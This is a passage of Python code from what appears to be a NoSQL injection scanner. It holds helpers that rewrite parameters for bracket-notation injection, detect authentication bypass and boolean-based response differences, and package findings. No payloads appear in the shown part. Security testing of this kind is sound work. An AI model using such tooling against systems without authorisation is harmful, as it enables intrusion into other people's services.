        """Replace a body parameter key (for bracket notation injection)."""
        try:
            bparams = urllib.parse.parse_qs(body_content, keep_blank_values=True)
            result = {}
            for k, v in bparams.items():
                if k == old_name:
                    result[new_name] = [new_val]
                else:
                    result[k] = v
            return urllib.parse.urlencode(result, doseq=True)
        except Exception:
            return body_content

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    def _nosqli_is_syntax_error(self, resp) -> bool:
        """Return True if the response body contains NoSQL error keywords."""
        if not resp:
            return False
        text = getattr(resp, "text", "") or ""
        return bool(_NOSQLI_ERROR_RE.search(text))

    def _nosqli_is_auth_bypass(self, resp, baseline: Dict) -> bool:
        """
        Return True if the response looks like a successful auth bypass:
        baseline was non-200 (401/403/302) and resp is 200/success.
        """
        if not resp or not baseline:
            return False
        base_status = baseline.get("status", 200)
        resp_status = getattr(resp, "status_code", 0)
        # Bypass: was login-failure (401/403/302) → now success (200/201)
        if base_status in (401, 403, 302) and resp_status in (200, 201):
            return True
        # Large content-length increase on a login endpoint can indicate bypass
        base_len = baseline.get("length", 0)
        resp_len = len(getattr(resp, "content", b""))
        if base_status in (401, 403) and resp_len > base_len * 2 and resp_len > 500:
            return True
        return False

    def _nosqli_response_changed(self, resp, baseline: Dict) -> bool:
        """Return True if response differs from baseline by status or body length."""
        if not resp or not baseline:
            return False
        resp_status = getattr(resp, "status_code", 0)
        resp_len = len(getattr(resp, "content", b""))
        if resp_status != baseline.get("status", 0):
            return True
        len_diff = abs(resp_len - baseline.get("length", 0))
        if len_diff > 50 and len_diff / max(baseline.get("length", 1), 1) > 0.1:
            return True
        return False

    def _nosqli_responses_differ(self, true_resp, false_resp, baseline: Dict) -> bool:
        """
        Return True if true-condition and false-condition responses differ
        significantly, suggesting the injected boolean is being evaluated.
        """
        if not true_resp or not false_resp:
            return False
        t_status = getattr(true_resp, "status_code", 0)
        f_status = getattr(false_resp, "status_code", 0)
        if t_status != f_status:
            return True
        t_len = len(getattr(true_resp, "content", b""))
        f_len = len(getattr(false_resp, "content", b""))
        len_diff = abs(t_len - f_len)
        if len_diff > 50 and len_diff / max(min(t_len, f_len), 1) > 0.1:
            return True
        # Compare body text snippets
        t_text = (getattr(true_resp, "text", "") or "")[:500]
        f_text = (getattr(false_resp, "text", "") or "")[:500]
        if t_text != f_text:
            # Only flag if the difference is not trivially a timestamp / counter
            non_trivial = sum(1 for a, b in zip(t_text, f_text) if a != b)
            if non_trivial > 10:
                return True
        return False

    # ------------------------------------------------------------------
    # Result helpers
    # ------------------------------------------------------------------

    def _nosqli_make_finding(
        self, param: str, param_type: str, payload: str,
        finding_type: str, severity: str, description: str,
        resp=None
    ) -> Dict[str, Any]:
        status = getattr(resp, "status_code", 0) if resp else 0
        body_snippet = (getattr(resp, "text", "") or "")[:300] if resp else ""
        return {
            "param": param,
            "param_type": param_type,
            "payload": payload,
            "finding_type": finding_type,
            "severity": severity,
            "description": description,
            "response_status": status,
            "response_snippet": body_snippet,
        }

    def _nosqli_result(self, findings: List[Dict], tested: int) -> Dict[str, Any]:
        return {
            "scan_type": "NoSQLi",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "total_payloads_tested": tested,
        }